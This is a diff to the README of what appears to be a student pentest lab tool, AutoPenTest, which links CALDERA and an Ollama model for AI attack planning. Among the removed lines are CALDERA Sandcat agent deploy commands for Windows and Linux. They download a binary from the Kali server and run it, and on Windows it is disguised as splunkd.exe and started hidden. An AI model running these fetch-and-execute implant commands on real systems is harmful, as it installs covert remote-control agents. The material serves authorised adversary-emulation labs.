@@ -66,12 +66,10 @@ CALDERA server are long-running processes.
 Terminal 1, install and start AutoPenTest:
 
 ```bash
-cd /home/kali/Desktop/AutoPenTest_Recon_Autonomous_Update_v32_8_from_v31
+cd /home/kali/Desktop/AutoPenTest_Recon_Autonomous_Update_v32_8_from_v31 or your fyp dir
 chmod +x install.sh
 sudo ./install.sh
 cd project
-cp .env.example .env 2>/dev/null || true
-nano .env
 sudo .venv/bin/python app.py
 ```
 
@@ -94,32 +92,7 @@ Terminal 4, start CALDERA:
 ```bash
 cd /path/to/caldera
 source .venv/bin/activate 2>/dev/null || true
-python3 server.py --insecure --host 0.0.0.0
-```
-
-Recommended `project/.env` values for a Kali VM lab:
-
-```bash
-SECRET_KEY=change-me
-DEBUG=false
-APP_HOST=0.0.0.0
-PORT=5000
-
-CALDERA_URL=http://127.0.0.1:8888
-CALDERA_API_KEY=redadmin
-AGENT_GROUP=red
-KALI_IP=CHANGE-THIS-TO-YOUR-KALI-IP
-OPERATION_TIMEOUT=180
-
-OLLAMA_URL=http://127.0.0.1:11434
-OLLAMA_MODEL=llama3.2:1b
-OLLAMA_TIMEOUT=180
-```
-
-To find the Kali IP to put in `KALI_IP`:
-
-```bash
-ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '^127\.'
+python3 server.py --insecure
 ```
 
 ## Manual Python Setup
@@ -225,13 +198,6 @@ references retained for analyst review.
 
 ## Ollama
 
-Install and start Ollama, then pull the configured model:
-
-```bash
-ollama serve
-ollama pull llama3.2:1b
-```
-
 The app uses Ollama for AI technique planning and the AI chat panel. If Ollama is unavailable, the app still runs and returns a safe unavailable message.
 
 The AI Chatbox shows Ollama status in the sidebar. If it says the model is not
@@ -245,31 +211,9 @@ ollama pull llama3.2:1b
 
 Start MITRE Caldera separately and configure `CALDERA_URL` plus `CALDERA_API_KEY`. The dashboard checks agent readiness for the scanned target IP and shows a copyable deploy command when no trusted agent is matched.
 
-Typical flow:
-
-```bash
-cd /path/to/caldera
-python3 server.py --insecure
-```
-
 Editable Windows Sandcat deploy command. Paste it into an authorised Windows
 lab target PowerShell session and edit only the IP in `$server` when your Kali
-VM IP changes:
-
-```powershell
-$server="http://CHANGE-THIS-TO-YOUR-KALI-IP:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;rm -force "C:\Users\Public\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
-```
-
-Editable Linux Sandcat deploy block:
-
-```bash
-# Edit this IP if your Kali VM address changes; it must be reachable from the target.
-CALDERA_SERVER='http://CHANGE-THIS-TO-YOUR-KALI-IP:8888';
-# Download the official Sandcat payload from CALDERA.
-curl -fsSL -H 'file:sandcat.go' -H 'platform:linux' "$CALDERA_SERVER/file/download" -o sandcat;
-# Start a fresh agent in the red group.
-chmod +x sandcat; ./sandcat -server "$CALDERA_SERVER" -group red
-```
+VM IP changes.
 
 Then in AutoPenTest:
 
